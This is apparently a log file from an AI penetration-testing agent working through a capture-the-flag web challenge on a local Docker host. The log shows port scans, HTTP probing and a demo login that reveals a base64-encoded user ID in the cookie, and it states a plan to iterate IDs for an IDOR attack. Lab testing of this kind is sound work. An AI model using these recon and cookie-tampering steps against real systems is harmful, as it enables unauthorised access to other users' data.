@@ -1,0 +1,1160 @@
+
+[STARTUP 2026-04-12T21:12:29.970Z] LOADING .env  →  mcp_server._app._load_dotenv
+[_app.py 21:12:29.978Z] importing FastMCP
+[_app.py 21:12:33.354Z] FastMCP imported OK
+[_app.py 21:12:33.354Z] importing core modules
+[_app.py 21:12:33.362Z] core modules imported OK
+[_app.py 21:12:33.362Z] instantiating FastMCP('pentest-agent')
+[_app.py 21:12:33.400Z] FastMCP instance created OK
+
+[STARTUP 2026-04-12T21:12:33.401Z] .env loaded OK
+[Sentry] SENTRY_DSN not set — error reporting disabled
+
+[STARTUP 2026-04-12T21:12:33.401Z] ENVIRONMENT SNAPSHOT
+  python      : 3.12.13 (main, Mar  4 2026, 09:23:07) [GCC 11.4.0]
+  platform    : Linux-5.15.0-174-generic-x86_64-with-glibc2.35
+  cwd         : /root/agent-smith
+  __file__    : /root/agent-smith/mcp_server/__main__.py
+  asyncio policy : _UnixDefaultEventLoopPolicy
+  event loop   : none running at startup (expected)
+
+[STARTUP 2026-04-12T21:12:33.404Z] IMPORTING  mcp_server.scan_tools
+[04/12/26 21:12:33] INFO     ====================================== logger.py:46
+                             ======================================             
+                             ====                                               
+                    INFO     SESSION_START  2026-04-12T21:12:33Z    logger.py:47
+
+[STARTUP 2026-04-12T21:12:33.430Z] OK         mcp_server.scan_tools
+
+[STARTUP 2026-04-12T21:12:33.430Z] IMPORTING  mcp_server.kali_tools
+
+[STARTUP 2026-04-12T21:12:33.435Z] OK         mcp_server.kali_tools
+
+[STARTUP 2026-04-12T21:12:33.435Z] IMPORTING  mcp_server.http_tools
+
+[STARTUP 2026-04-12T21:12:33.443Z] OK         mcp_server.http_tools
+
+[STARTUP 2026-04-12T21:12:33.444Z] IMPORTING  mcp_server.report_tools
+
+[STARTUP 2026-04-12T21:12:33.455Z] OK         mcp_server.report_tools
+
+[STARTUP 2026-04-12T21:12:33.455Z] IMPORTING  mcp_server.session_tools
+
+[STARTUP 2026-04-12T21:12:33.470Z] OK         mcp_server.session_tools
+
+[STARTUP 2026-04-12T21:12:33.470Z] AUDITING registered tools
+
+[STARTUP 2026-04-12T21:12:33.470Z] Tools registered: 5  (see logs/tools_registered.log)
+
+[STARTUP 2026-04-12T21:12:33.470Z] DOCKER IMAGE PREFLIGHT CHECK
+  [OK]      instrumentisto/nmap@sha256:96f6ed194519b62421a1a1c57809e65a7f94d2aa1c8c25676f247e5e148c0827
+  [OK]      projectdiscovery/naabu@sha256:4b28540e4de8209ba5f499f704f43f6f780dfd5b19e97533d44053bfb309da5b
+  [OK]      projectdiscovery/httpx@sha256:043677c2c4ec10d8ba5e01d82eb368a29f54348893a391b8e95b7119b41db292
+  [OK]      projectdiscovery/subfinder@sha256:5e62f2c278b6b32c957b8afd6bbefaed3e1ae0fd5b3c67a4d08eb15c65531399
+  [MISSING] projectdiscovery/nuclei@sha256:cd763beb886f99dbac2526847431059077d67cda77c51bfae73f45987cc5fd92  — will pull on first use
+  [MISSING] semgrep/semgrep@sha256:3dab091ee3247fce7e4ed3df9f92b3bd72692c083295f53cec3f135b86404db1  — will pull on first use
+  [MISSING] trufflesecurity/trufflehog@sha256:d30c74906d19a1c7e3021d9d615e245bf159acece38bbc269c5dde9a8d775480  — will pull on first use
+
+[STARTUP 2026-04-12T21:12:33.662Z] PREFLIGHT: 4/7 images ready. Run 'docker pull' or session(action='pull_images') for: projectdiscovery/nuclei@sha256:cd763beb886f99dbac2526847431059077d67cda77c51bfae73f45987cc5fd92, semgrep/semgrep@sha256:3dab091ee3247fce7e4ed3df9f92b3bd72692c083295f53cec3f135b86404db1, trufflesecurity/trufflehog@sha256:d30c74906d19a1c7e3021d9d615e245bf159acece38bbc269c5dde9a8d775480
+
+[STARTUP 2026-04-12T21:12:33.662Z] PATCHING MCP SDK for ClosedResourceError resilience
+
+[STARTUP 2026-04-12T21:12:33.662Z] MCP SDK patched OK
+
+[STARTUP 2026-04-12T21:12:33.662Z] CALLING mcp.run()  — server handshake begins now
+                    INFO     Processing request of type            server.py:720
+                             ListToolsRequest                                   
+                    INFO     Processing request of type            server.py:720
+                             ListPromptsRequest                                 
+                    INFO     Processing request of type            server.py:720
+                             ListResourcesRequest                               
+                    INFO     Processing request of type            server.py:720
+                             ListResourceTemplatesRequest                       
+[04/12/26 21:12:48] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Scan started —            logger.py:84
+                             target=http://172.17.0.1:49433                     
+                             depth=thorough  limits: $100.0 /                   
+                             480min / 0 calls                                   
+[04/12/26 21:12:50] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    dashboard                 logger.py:56
+                             args={"port": 5000}                                
+[04/12/26 21:12:52] INFO     TOOL_RESULT  dashboard                 logger.py:61
+                             http://localhost:5000                              
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    naabu                     logger.py:56
+                             args={"host": "172.17.0.1", "ports":               
+                             "top-100", "flags": ""}                            
+[04/12/26 21:12:56] DEBUG    RAW_STDOUT   naabu                     logger.py:67
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:12:54.334287853Z","port":22,"p             
+                             rotocol":"tcp","tls":false}                        
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:12:54.335877851Z","port":5000,             
+                             "protocol":"tcp","tls":false}                      
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:12:56.356106027Z","port":5000,             
+                             "protocol":"tcp","tls":false}                      
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:12:56.356184292Z","port":22,"p             
+                             rotocol":"tcp","tls":false}                        
+                                                                                
+                    DEBUG    RAW_STDERR   naabu                     logger.py:69
+                                                                                
+                                               __                               
+                               ___  ___  ___ _/ /  __ __                        
+                              / _ \/ _ \/ _ \/ _ \/ // /                        
+                             /_//_/\_,_/\_,_/_.__/\_,_/                         
+                                                                                
+                                             projectdiscovery.io                
+                                                                                
+                             [[34mINF[0m] Current naabu version                 
+                             2.5.0 ([92mlatest[0m)                              
+                             [[93mWRN[0m] UI Dashboard is disabled,             
+                             Use -dashboard option to enable                    
+                             [[34mINF[0m] Running CONNECT scan with             
+                             non root privileges                                
+                             [[34mINF[0m] Found 2 ports on host                 
+                             172.17.0.1 (172.17.0.1)                            
+                                                                                
+                    INFO     TOOL_RESULT  naabu                     logger.py:61
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:12:54.334287853Z","port":22,"p             
+                             rotocol":"tcp","tls":false}                        
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:12:54.335877851Z","port":5000,             
+                             "protocol":"tcp","tls":false}                      
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:12:56.356106027Z","port":5000,             
+                             "protocol":"tcp","tls":false}                      
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:12:56.356184292Z","port":22,"p             
+                             rotocol":"tcp","tls":false}                        
+                                                                                
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:13:01] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Port scan found SSH (22)  logger.py:84
+                             and port 5000. Target is on                        
+                             non-standard port 49433 which naabu                
+                             top-100 missed. Probing the actual                 
+                             target at http://172.17.0.1:49433                  
+                             directly.                                          
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    httpx                     logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49433", "flags":                
+                             ""}                                                
+[04/12/26 21:13:05] DEBUG    RAW_STDOUT   httpx                     logger.py:67
+                             {"timestamp":"2026-04-12T21:13:05.0917             
+                             05587Z","port":"49433","url":"http://1             
+                             72.17.0.1:49433","input":"http://172.1             
+                             7.0.1:49433","title":"Login","scheme":             
+                             "http","webserver":"uvicorn","content_             
+                             type":"text/html","method":"GET","host             
+                             ":"172.17.0.1","host_ip":"172.17.0.1",             
+                             "path":"/","time":"18.608216ms","a":["             
+                             172.17.0.1"],"tech":["Bootstrap:4.5.2"             
+                             ,"Python","Uvicorn"],"words":258,"line             
+                             s":47,"status_code":200,"content_lengt             
+                             h":1258,"failed":false,"knowledgebase"             
+                             :{"pHash":0}}                                      
+                                                                                
+                    DEBUG    RAW_STDERR   httpx                     logger.py:69
+                                                                                
+                                 __    __  __       _  __                       
+                                / /_  / /_/ /_____ | |/ /                       
+                               / __ \/ __/ __/ __ \|   /                        
+                              / / / / /_/ /_/ /_/ /   |                         
+                             /_/ /_/\__/\__/ .___/_/|_|                         
+                                          /_/                                   
+                                                                                
+                                             projectdiscovery.io                
+                                                                                
+                             [[34mINF[0m] Current httpx version                 
+                             v1.9.0 ([92mlatest[0m)                             
+                             [[93mWRN[0m] UI Dashboard is disabled,             
+                             Use -dashboard option to enable                    
+                                                                                
+                    INFO     TOOL_RESULT  httpx                     logger.py:61
+                             {"timestamp":"2026-04-12T21:13:05.0917             
+                             05587Z","port":"49433","url":"http://1             
+                             72.17.0.1:49433","input":"http://172.1             
+                             7.0.1:49433","title":"Login","scheme":             
+                             "http","webserver":"uvicorn","content_             
+                             type":"text/html","method":"GET","host             
+                             ":"172.17.0.1","host_ip":"172.17.0.1",             
+                             "path":"/","time":"18.608216ms","a":["             
+                             172.17.0.1"],"tech":["Bootstrap:4.5.2"             
+                             ,"Python","Uvicorn"],"words":258,"line             
+                             s":47,"status_code":200,"content_lengt             
+                             h":1258,"failed":false,"knowledgebase"             
+                             :{"pHash":0}}                                      
+                                                                                
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:13:10] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Target:                   logger.py:84
+                             http://172.17.0.1:49433 -                          
+                             Python/Uvicorn, Bootstrap 4.5.2, shows             
+                             Login page. CTF hint: IDOR via                     
+                             base64-encoded cookie storing user ID.             
+                             Plan: register account, observe                    
+                             cookie, decode base64, iterate user                
+                             IDs to find flag.                                  
+[04/12/26 21:13:12] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49433", "method":               
+                             "GET", "poc": false}                               
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Date": "Sun, 12 Apr 2026 21:13:12             
+                             GMT",                                              
+                                 "Server": "uvicorn",                           
+                                 "Content-Length": "1258",                      
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8"                                     
+                               },                                               
+                               "body": "<!DOCTYPE html>\n<html                  
+                             lang=\"en\">\n<head>\n    <meta                    
+                             charset=\"UTF-8\">\n    <meta                      
+                             name=\"viewport\"                                  
+                             content=\"width=device-width,                      
+                             initial-scale=1.0\">\n    <link                    
+                             rel=\"stylesheet\"                                 
+                             href=\"https://stackpath.bootstrapcdn.             
+                             com/bootstrap/4.5.2/css/bootstrap.min.             
+                             css\">\n    <title>Login</title>\n                 
+                             <style>\n        body {\n                          
+                             display: flex;\n        }\n                        
+                             .nav {\n            width: 200px;\n                
+                             }\n        .content {\n                            
+                             flex-grow: 1;\n            padding:                
+                             20px;\n        }\n                                 
+                             </style>\n</head>\n<body>\n    <div                
+                             class=\"nav flex-column nav-pills\"                
+                             aria-orientation=\"vertical\">\n                   
+                             \n\n    </div>\n    <div                           
+                             class=\"content\">\n                               
+                             \n<h2>Login</h2>\n\n\n<p>To try the                
+                             app you can use the demo account:                  
+                             <strong>Username:</strong> demo,                   
+                             <strong>Password:</strong>                         
+                             demo</p>\n\n<form method=\"post\"                  
+                             action=\"/token\">\n    <div                       
+                             class=\"form-group\">\n        <label              
+                             for=\"username\">Company                           
+                             Name</label>\n        <input                       
+                             type=\"text\" class=\"form-control\"               
+                             id=\"username\" name=\"username\"                  
+                             required>\n    </div>\n    <div                    
+                             class=\"form-group\">\n        <label              
+                             for=\"password\">Password</label>\n                
+                             <input type=\"password\"                           
+                             class=\"form-control\" id=\"password\"             
+                             name=\"password\" required>\n                      
+                             </div>\n    <button type=\"submit\"                
+                             class=\"btn                                        
+                             btn-primary\">Login</button>\n</form>\             
+                             n\n    </div>\n</body>\n</html>",                  
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:13:15] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49433/token",                   
+                             "method": "POST", "poc": false}                    
+[04/12/26 21:13:16] INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 401,                                   
+                               "headers": {                                     
+                                 "Date": "Sun, 12 Apr 2026 21:13:15             
+                             GMT",                                              
+                                 "Server": "uvicorn",                           
+                                 "WWW-Authenticate": "Bearer",                  
+                                 "Content-Length": "30",                        
+                                 "Content-Type": "application/json"             
+                               },                                               
+                               "body": "{\"detail\":\"Not                       
+                             authenticated\"}",                                 
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:13:21] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49433/token",                   
+                             "method": "POST", "poc": false}                    
+[04/12/26 21:13:22] INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 401,                                   
+                               "headers": {                                     
+                                 "Date": "Sun, 12 Apr 2026 21:13:21             
+                             GMT",                                              
+                                 "Server": "uvicorn",                           
+                                 "WWW-Authenticate": "Bearer",                  
+                                 "Content-Length": "30",                        
+                                 "Content-Type": "application/json"             
+                               },                                               
+                               "body": "{\"detail\":\"Not                       
+                             authenticated\"}",                                 
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    ffuf                      logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49433", "wordlist":             
+                             "common.txt", "extensions":                        
+                             ".txt,.php,.py,.json,.html", "flags":              
+                             ""}                                                
+[04/12/26 21:17:53] INFO     TOOL_RESULT  ffuf                      logger.py:61
+                             Fuzz Faster U Fool - v2.1.0-dev                    
+                                                                                
+                             HTTP OPTIONS:                                      
+                               -H                  Header `"Name:               
+                             Value"`, separated by colon. Multiple              
+                             -H flags are accepted.                             
+                               -X                  HTTP method to               
+                             use                                                
+                               -b                  Cookie data                  
+                             `"NAME1=VALUE1; NAME2=VALUE2"` for                 
+                             copy as curl functionality.                        
+                               -cc                 Client cert for              
+                             authentication. Client key needs to be             
+                             defined as well for this to work                   
+                               -ck                 Client key for               
+                             authentication. Client certificate                 
+                             needs to be defined as well for this               
+                             to work                                            
+                               -d                  POST data                    
+                               -http2              Use HTTP2                    
+                             protocol (default: false)                          
+                               -ignore-body        Do not fetch the             
+                             response content. (default: false)                 
+                               -r                  Follow redirects             
+                             (default: false)                                   
+                               -raw                Do not encode                
+                             URI (default: false)                               
+                               -recursion          Scan                         
+                             recursively. Only FUZZ keyword is                  
+                             supported, and URL (-u) has to end in              
+                             it. (default: false)                               
+                               -recursion-depth    Maximum                      
+                             recursion depth. (default: 0)                      
+                               -recursion-strategy Recursion                    
+                             strategy: "default" for a redirect                 
+                             based, and "greedy" to recurse on all              
+                             matches (default: default)                         
+                               -replay-proxy       Replay matched               
+                             requests using this proxy.                         
+                               -sni                Target TLS SNI,              
+                             does not support FUZZ keyword                      
+                               -timeout            HTTP request                 
+                             timeout in seconds. (default: 10)                  
+                               -u                  Target URL                   
+                               -x                  Proxy URL                    
+                             (SOCKS5 or HTTP). For example:                     
+                             http://127.0.0.1:8080 or                           
+                             socks5://127.0.0.1:8080                            
+                                                                                
+                             GENERAL OPTIONS:                                   
+                               -V                  Show version                 
+                             information. (default: false)                      
+                               -ac                 Automatically                
+                             calibrate filtering options (default:              
+                             false)                                             
+                               -acc                Custom                       
+                             auto-calibration string. Can be used               
+                             multiple times. Implies -ac                        
+                               -ach                Per host                     
+                             autocalibration (default: false)                   
+                               -ack                Autocalibration              
+                             keyword (default: FUZZ)                            
+                               -acs                Custom                       
+                             auto-calibration strategies. Can be                
+                             used multiple times. Implies -ac                   
+                               -c                  Colorize output.             
+                             (default: false)                                   
+                               -config             Load                         
+                             configuration from a file                          
+                               -json               JSON output,                 
+                             printing newline-delimited JSON                    
+                             records (default: false)                           
+                               -maxtime            Maximum running              
+                             time in seconds for entire process.                
+                             (default: 0)                                       
+                               -maxtime-job        Maximum running              
+                             time in seconds per job. (default: 0)              
+                               -noninteractive     Disable the                  
+                             interactive console functionality                  
+                             (default: false)                                   
+                               -p                  Seconds of                   
+                             `delay` between requests, or a range               
+                             of random delay. For example "0.1" or              
+                             "0.1-2.0"                                          
+                               -rate               Rate of requests             
+                             per second (default: 0)                            
+                               -s                  Do not print                 
+                             additional information (silent mode)               
+                             (default: false)                                   
+                               -sa                 Stop on all                  
+                             error cases. Implies -sf and -se.                  
+                             (default: false)                                   
+                               -scraperfile        Custom scraper               
+                             file path                                          
+                               -scrapers           Active scraper               
+                             groups (default: all)                              
+                               -se                 Stop on spurious             
+                             errors (default: false)                            
+                               -search             Search for a                 
+                             FFUFHASH payload from ffuf history                 
+                               -sf                 Stop when > 95%              
+                             of responses return 403 Forbidden                  
+                             (default: false)                                   
+                               -t                  Number of                    
+                             concurrent threads. (default: 40)                  
+                               -v                  Verbose output,              
+                             printing full URL and redirect                     
+                             location (if any) with the results.                
+                             (default: false)                                   
+                                                                                
+                             MATCHER OPTIONS:                                   
+                               -mc                 Match HTTP                   
+                             status codes, or "all" for everything.             
+                             (default:                                          
+                             200-299,301,302,307,401,403,405,500)               
+                               -ml                 Match amount of              
+                             lines in response                                  
+                               -mmode              Matcher set                  
+                             operator. Either of: and, or (default:             
+                             or)                                                
+                               -mr                 Match regexp                 
+                               -ms                 Match HTTP                   
+                             response size                                      
+                               -mt                 Match how many               
+                             milliseconds to the first response                 
+                             byte, either greater or less than. EG:             
+                             >100 or <100                                       
+                               -mw                 Match amount of              
+                             words in response                                  
+                                                                                
+                             FILTER OPTIONS:                                    
+                               -fc                 Filter HTTP                  
+                             status codes from response. Comma                  
+                             separated list of codes and ranges                 
+                               -fl                 Filter by amount             
+                             of lines in response. Comma separated              
+                             list of line counts and ranges                     
+                               -fmode              Filter set                   
+                             operator. Either of: and, or (default:             
+                             or)                                                
+                               -fr                 Filter regexp                
+                               -fs                 Filter HTTP                  
+                             response size. Comma separated list of             
+                             sizes and ranges                                   
+                               -ft                 Filter by number             
+                             of milliseconds to the first response              
+                             byte, either greater or less than. EG:             
+                             >100 or <100                                       
+                               -fw                 Filter by amount             
+                             of words in response. Comma separated              
+                             list of word counts and ranges                     
+                                                                                
+                             INPUT OPTIONS:                                     
+                               -D                  DirSearch                    
+                             wordlist compatibility mode. Used in               
+                             conjunction with -e flag. (default:                
+                             false)                                             
+                               -e                  Comma separated              
+                             list of extensions. Extends FUZZ                   
+                             keyword.                                           
+                               -enc                Encoders for                 
+                             keywords, eg. 'FUZZ:urlencode                      
+                             b64encode'                                         
+                               -ic                 Ignore wordlist              
+                             comments (default: false)                          
+                               -input-cmd          Command                      
+                             producing the input. --input-num is                
+                             required when using this input method.             
+                             Overrides -w.                                      
+                               -input-num          Number of inputs             
+                             to test. Used in conjunction with                  
+                             --input-cmd. (default: 100)                        
+                               -input-shell        Shell to be used             
+                             for running command                                
+                               -mode               Multi-wordlist               
+                             operation mode. Available modes:                   
+                             clusterbomb, pitchfork, sniper                     
+                             (default: clusterbomb)                             
+                               -request            File containing              
+                             the raw http request                               
+                               -request-proto      Protocol to use              
+                             along with raw request (default:                   
+                             https)                                             
+                               -w                  Wordlist file                
+                             path and (optional) keyword separated              
+                             by colon. eg.                                      
+                             '/path/to/wordlist:KEYWORD'                        
+                                                                                
+                             OUTPUT OPTIONS:                                    
+                               -debug-log          Write all of the             
+                             internal logging to the specified                  
+                             file.                                              
+                               -o                  Write output to              
+                             file                                               
+                               -od                 Directory path               
+                             to store matched results to.                       
+                               -of                 Output file                  
+                             format. Available formats: json,                   
+                             ejson, html, md, csv, ecsv (or, 'all'              
+                             for all formats) (default: json)                   
+                               -or                 Don't create the             
+                             output file if we don't have results               
+                             (default: false)                                   
+                                                                                
+                             EXAMPLE USAGE:                                     
+                               Fuzz file paths from wordlist.txt,               
+                             match all responses but filter out                 
+                             those with content-size 42.                        
+                               Colored, verbose output.                         
+                                 ffuf -w wordlist.txt -u                        
+                             https://example.org/FUZZ -mc all -fs               
+                             42 -c -v                                           
+                                                                                
+                               Fuzz Host-header, match HTTP 200                 
+                             responses.                                         
+                                 ffuf -w hosts.txt -u                           
+                             https://example.org/ -H "Host: FUZZ"               
+                             -mc 200                                            
+                                                                                
+                               Fuzz POST JSON data. Match all                   
+                             responses not containing text "error".             
+                                 ffuf -w entries.txt -u                         
+                             https://example.org/ -X POST -H                    
+                             "Content-Type: application/json" \                 
+                                   -d '{"name": "FUZZ",                         
+                             "anotherkey": "anothervalue"}' -fr                 
+                             "error"                                            
+                                                                                
+                               Fuzz multiple locations. Match only              
+                             responses reflecting the value of                  
+                             "VAL" keyword. Colored.                            
+                                 ffuf -w params.txt:PARAM -w                    
+                             values.txt:VAL -u                                  
+                             https://example.org/?PARAM=VAL -mr                 
+                             "VAL" -c                                           
+                                                                                
+                               More information and examples:                   
+                             https://github.com/ffuf/ffuf                       
+                                                                                
+                                                                                
+                             Encountered error(s): 1 errors                     
+                             occurred.                                          
+                                     * stat                                     
+                             /usr/share/mcp-kali-server/common.txt:             
+                             no such file or directory                          
+                                                                                
+                             Encountered error(s): 1 errors                     
+                             occurred.                                          
+                                     * stat                                     
+                             /usr/share/mcp-kali-server/common.txt:             
+                             no such file or directory                          
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:18:02] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    kali                      logger.py:56
+                             args={"command": "curl -v -X POST                  
+                             http://172.17.0.1:49433/token -H                   
+                             \"Content-Type:                                    
+                             application/x-www-form-urlencoded\" -d             
+                             \"username=demo&password=demo\" 2>&1",             
+                             "timeout": 600}                                    
+[04/12/26 21:18:03] DEBUG    RAW_STDOUT   kali                      logger.py:67
+                             Note: Unnecessary use of -X or                     
+                             --request, POST is already inferred.               
+                               % Total    % Received % Xferd                    
+                             Average Speed  Time    Time    Time                
+                             Current                                            
+                                                              Dload             
+                             Upload  Total   Spent   Left   Speed               
+                                                                                
+                               0      0   0      0   0      0                   
+                             0      0                                           
+                             0*   Trying 172.17.0.1:49433...                    
+                             * Established connection to 172.17.0.1             
+                             (172.17.0.1 port 49433) from                       
+                             172.17.0.2 port 43620                              
+                             * using HTTP/1.x                                   
+                             > POST /token HTTP/1.1                             
+                             > Host: 172.17.0.1:49433                           
+                             > User-Agent: curl/8.19.0                          
+                             > Accept: */*                                      
+                             > Content-Type:                                    
+                             application/x-www-form-urlencoded                  
+                             > Content-Length: 27                               
+                             >                                                  
+                             } [27 bytes data]                                  
+                             * upload completely sent off: 27 bytes             
+                             < HTTP/1.1 303 See Other                           
+                             < date: Sun, 12 Apr 2026 21:18:02 GMT              
+                             < server: uvicorn                                  
+                             < content-length: 0                                
+                             < location: /company/1/jobs                        
+                             < set-cookie: access_token="Bearer                 
+                             MQ=="; HttpOnly; Path=/; SameSite=lax              
+                             <                                                  
+                                                                                
+                             100     27   0      0 100     27                   
+                             0     80                                           
+                             0                                                  
+                             100     27   0      0 100     27                   
+                             0     80                                           
+                             0                                                  
+                             100     27   0      0 100     27                   
+                             0     80                                           
+                             0                                                  
+                             * Connection #0 to host                            
+                             172.17.0.1:49433 left intact                       
+                    INFO     TOOL_RESULT  kali                      logger.py:61
+                             Note: Unnecessary use of -X or                     
+                             --request, POST is already inferred.               
+                               % Total    % Received % Xferd                    
+                             Average Speed  Time    Time    Time                
+                             Current                                            
+                                                              Dload             
+                             Upload  Total   Spent   Left   Speed               
+                                                                                
+                               0      0   0      0   0      0                   
+                             0      0                                           
+                             0*   Trying 172.17.0.1:49433...                    
+                             * Established connection to 172.17.0.1             
+                             (172.17.0.1 port 49433) from                       
+                             172.17.0.2 port 43620                              
+                             * using HTTP/1.x                                   
+                             > POST /token HTTP/1.1                             
+                             > Host: 172.17.0.1:49433                           
+                             > User-Agent: curl/8.19.0                          
+                             > Accept: */*                                      
+                             > Content-Type:                                    
+                             application/x-www-form-urlencoded                  
+                             > Content-Length: 27                               
+                             >                                                  
+                             } [27 bytes data]                                  
+                             * upload completely sent off: 27 bytes             
+                             < HTTP/1.1 303 See Other                           
+                             < date: Sun, 12 Apr 2026 21:18:02 GMT              
+                             < server: uvicorn                                  
+                             < content-length: 0                                
+                             < location: /company/1/jobs                        
+                             < set-cookie: access_token="Bearer                 
+                             MQ=="; HttpOnly; Path=/; SameSite=lax              
+                             <                                                  
+                                                                                
+                             100     27   0      0 100     27                   
+                             0     80                                           
+                             0                                                  
+                             100     27   0      0 100     27                   
+                             0     80                                           
+                             0                                                  
+                             100     27   0      0 100     27                   
+                             0     80                                           
+                             0                                                  
+                             * Connection #0 to host                            
+                             172.17.0.1:49433 left intact                       
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:18:09] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Login successful! Cookie: logger.py:84
+                             access_token='Bearer MQ==' which                   
+                             decodes to user ID 1 (MQ== is base64               
+                             for '1'). Redirects to                             
+                             /company/1/jobs. IDOR vector confirmed             
+                             - base64 encoded user ID in cookie.                
+                             Will iterate user IDs to find flag.                
+[04/12/26 21:18:17] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    kali                      logger.py:56
+                             args={"command": "curl -v                          
+                             http://172.17.0.1:49433/company/1/jobs             
+                             -H 'Cookie: access_token=\"Bearer                  
+                             MQ==\"' 2>&1", "timeout": 600}                     
+[04/12/26 21:18:18] DEBUG    RAW_STDOUT   kali                      logger.py:67
+                             % Total    % Received % Xferd  Average             
+                             Speed  Time    Time    Time   Current              
+                                                              Dload             
+                             Upload  Total   Spent   Left   Speed               
+                                                                                
+                               0      0   0      0   0      0                   
+                             0      0                                           
+                             0*   Trying 172.17.0.1:49433...                    
+                             * Established connection to 172.17.0.1             
+                             (172.17.0.1 port 49433) from                       
+                             172.17.0.2 port 55386                              
+                             * using HTTP/1.x                                   
+                             > GET /company/1/jobs HTTP/1.1                     
+                             > Host: 172.17.0.1:49433                           
+                             > User-Agent: curl/8.19.0                          
+                             > Accept: */*                                      
+                             > Cookie: access_token="Bearer MQ=="               
+                             >                                                  
+                             * Request completely sent off                      
+                             < HTTP/1.1 200 OK                                  
+                             < date: Sun, 12 Apr 2026 21:18:17 GMT              
+                             < server: uvicorn                                  
+                             < content-length: 956                              
+                             < content-type: text/html;                         
+                             charset=utf-8                                      
+                             <                                                  
+                             { [956 bytes data]                                 
+                                                                                
+                             100    956 100    956   0      0                   
+                             66384      0                                       
+                             0                                                  
+                             100    956 100    956   0      0                   
+                             66026      0                                       
+                             0                                                  
+                             100    956 100    956   0      0                   
+                             65403      0                                       
+                             0                                                  
+                             * Connection #0 to host                            
+                             172.17.0.1:49433 left intact                       
+                             <!DOCTYPE html>                                    
+                             <html lang="en">                                   
+                             <head>                                             
+                                 <meta charset="UTF-8">                         
+                                 <meta name="viewport"                          
+                             content="width=device-width,                       
+                             initial-scale=1.0">                                
+                                 <link rel="stylesheet"                         
+                             href="https://stackpath.bootstrapcdn.c             
+                             om/bootstrap/4.5.2/css/bootstrap.min.c             
+                             ss">                                               
+                                 <title>Jobs</title>                            
+                                 <style>                                        
+                                     body {                                     
+                                         display: flex;                         
+                                     }                                          
+                                     .nav {                                     
+                                         width: 200px;                          
+                                     }                                          
+                                     .content {                                 
+                                         flex-grow: 1;                          
+                                         padding: 20px;                         
+                                     }                                          
+                                 </style>                                       
+                             </head>                                            
+                             <body>                                             
+                                 <div class="nav flex-column                    
+                             nav-pills"                                         
+                             aria-orientation="vertical">                       
+                                                                                
+                                     <a class="nav-link"                        
+                             href="/company/1/jobs">View Jobs</a>               
+                                     <a class="nav-link"                        
+                             href="/edit_profile/1">Edit                        
+                             Profile</a>                                        
+                                                                                
+                                                                                
+                                 </div>                                         
+                                 <div class="content">                          
+                                                                                
+                             <h2>Jobs for Company 1</h2>                        
+                             <ul class="list-group">                            
+                                                                                
+                                 <li class="list-group-item">                   
+                                     <p>demo Job 1:demo Job 1                   
+                             Description</p>                                    
+                                 </li>                                          
+                                                                                
+                             </ul>                                              
+                                                                                
+                                 </div>                                         
+                             </body>                                            
+                             </html>                                            
+                    INFO     TOOL_RESULT  kali                      logger.py:61
+                             % Total    % Received % Xferd  Average             
+                             Speed  Time    Time    Time   Current              
+                                                              Dload             
+                             Upload  Total   Spent   Left   Speed               
+                                                                                
+                               0      0   0      0   0      0                   
+                             0      0                                           
+                             0*   Trying 172.17.0.1:49433...                    
+                             * Established connection to 172.17.0.1             
+                             (172.17.0.1 port 49433) from                       
+                             172.17.0.2 port 55386                              
